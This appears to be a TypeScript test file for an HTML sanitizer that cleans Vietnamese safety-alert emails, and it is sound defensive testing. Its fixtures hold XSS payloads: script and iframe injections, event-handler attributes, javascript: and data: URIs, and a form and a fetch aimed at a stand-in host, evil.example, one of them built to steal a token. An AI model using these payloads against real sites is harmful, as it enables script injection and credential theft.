import { describe, it } from "node:test";
import assert from "node:assert/strict";
import { JSDOM } from "jsdom";
import { sanitizeHtml } from "../sanitize-html";

function createTestWindow(): Parameters<typeof sanitizeHtml>[1] {
  const dom = new JSDOM("<!DOCTYPE html><html><body></body></html>");
  return dom.window as unknown as Parameters<typeof sanitizeHtml>[1];
}

describe("sanitizeHtml", () => {
  it("returns empty string on SSR (no window) or empty input", () => {
    assert.equal(sanitizeHtml(undefined), "");
    assert.equal(sanitizeHtml(null), "");
    assert.equal(sanitizeHtml(""), "");
    assert.equal(sanitizeHtml("<script>alert(1)</script><p>Hello</p>"), "");
  });

  it("strips script tags, iframe, object, embed, form, and style tags", () => {
    const win = createTestWindow();
    const dirty = [
      '<p>Thông báo khẩn</p>',
      '<script>alert("xss")</script>',
      '<script src="https://evil.example/xss.js"></script>',
      '<iframe src="javascript:alert(1)"></iframe>',
      '<iframe src="https://evil.example/embed"></iframe>',
      '<object data="https://evil.example/obj.swf"></object>',
      '<embed src="https://evil.example/emb.swf">',
      '<form action="https://evil.example/steal"><input name="token"><button>Gửi</button></form>',
      '<style>body { display: none; }</style>',
    ].join("");

    const clean = sanitizeHtml(dirty, win);
    assert.match(clean, /<p>Thông báo khẩn<\/p>/);
    assert.doesNotMatch(clean, /<script/i);
    assert.doesNotMatch(clean, /<iframe/i);
    assert.doesNotMatch(clean, /<object/i);
    assert.doesNotMatch(clean, /<embed/i);
    assert.doesNotMatch(clean, /<form/i);
    assert.doesNotMatch(clean, /<style/i);
    assert.doesNotMatch(clean, /alert\(/i);
  });

  it("strips inline event handlers and svg/math payloads", () => {
    const win = createTestWindow();
    const dirty = [
      '<img src="https://example.com/ok.png" onerror="alert(1)" alt="PPE">',
      '<div onmouseover="fetch(\'https://evil.example\')" onclick="alert(2)">Cảnh báo</div>',
      '<svg onload="alert(3)"><circle r="10" /></svg>',
    ].join("");

    const clean = sanitizeHtml(dirty, win);
    assert.match(clean, /<img[^>]*alt="PPE"/);
    assert.match(clean, /<div>Cảnh báo<\/div>/);
    assert.doesNotMatch(clean, /onerror/i);
    assert.doesNotMatch(clean, /onload/i);
    assert.doesNotMatch(clean, /onmouseover/i);
    assert.doesNotMatch(clean, /onclick/i);
    assert.doesNotMatch(clean, /<svg/i);
  });

  it("blocks javascript: and data: URIs and enforces rel=noopener noreferrer on target=_blank", () => {
    const win = createTestWindow();
    const dirty = [
      '<a href="javascript:alert(1)">Độc hại</a>',
      '<a href="data:text/html,<script>alert(1)</script>">Data URI</a>',
      '<a href="https://app.example.com/incidents" target="_blank">Xem sự cố</a>',
    ].join("");

    const clean = sanitizeHtml(dirty, win);
    assert.doesNotMatch(clean, /javascript:/i);
    assert.doesNotMatch(clean, /data:text\/html/i);
    assert.match(clean, /href="https:\/\/app\.example\.com\/incidents"/);
    assert.match(clean, /rel="noopener noreferrer"/);
  });

  it("preserves safe email layout HTML and inline CSS styles", () => {
    const win = createTestWindow();
    const emailHtml = `
      <div style="font-family: Arial, sans-serif; max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #e0e0e0; border-radius: 8px; background-color: #ffffff;">
        <h2 style="color: #4CAF50; text-align: center; margin-bottom: 24px;">Cảnh báo vi phạm PPE</h2>
        <p>Công nhân <strong>Nguyễn Văn An</strong> thiếu mũ bảo hộ.</p>
        <table><tr><td style="padding: 8px;">CAM-NORTH-04</td></tr></table>
        <a href="http://localhost:3000/incidents" style="background-color: #4CAF50; color: white; padding: 14px 28px; text-decoration: none;">Chi tiết</a>
        <hr style="border: none; border-top: 1px solid #e0e0e0; margin: 24px 0;" />
      </div>
    `;

    const clean = sanitizeHtml(emailHtml, win);
    assert.match(clean, /style="[^"]*font-family:\s*Arial/i);
    assert.match(clean, /<h2 style="[^"]*color:\s*#4CAF50/i);
    assert.match(clean, /<strong>Nguyễn Văn An<\/strong>/);
    assert.match(clean, /<table>[\s\S]*<td style="padding:\s*8px;?">CAM-NORTH-04<\/td>[\s\S]*<\/table>/);
    assert.match(clean, /<a[^>]*href="http:\/\/localhost:3000\/incidents"/);
    assert.match(clean, /<hr style="/);
  });

  it("uses globalThis.window automatically in browser-like environments", () => {
    const win = createTestWindow();
    const hadWindow = "window" in globalThis;
    const previousDescriptor = Object.getOwnPropertyDescriptor(globalThis, "window");
    Object.defineProperty(globalThis, "window", {
      value: win,
      configurable: true,
      writable: true,
    });

    try {
      const clean = sanitizeHtml('<p>An toàn</p><script>alert("xss")</script>');
      assert.equal(clean, "<p>An toàn</p>");
    } finally {
      if (hadWindow && previousDescriptor) {
        Object.defineProperty(globalThis, "window", previousDescriptor);
      } else {
        delete (globalThis as Record<string, unknown>).window;
      }
    }
  });
});

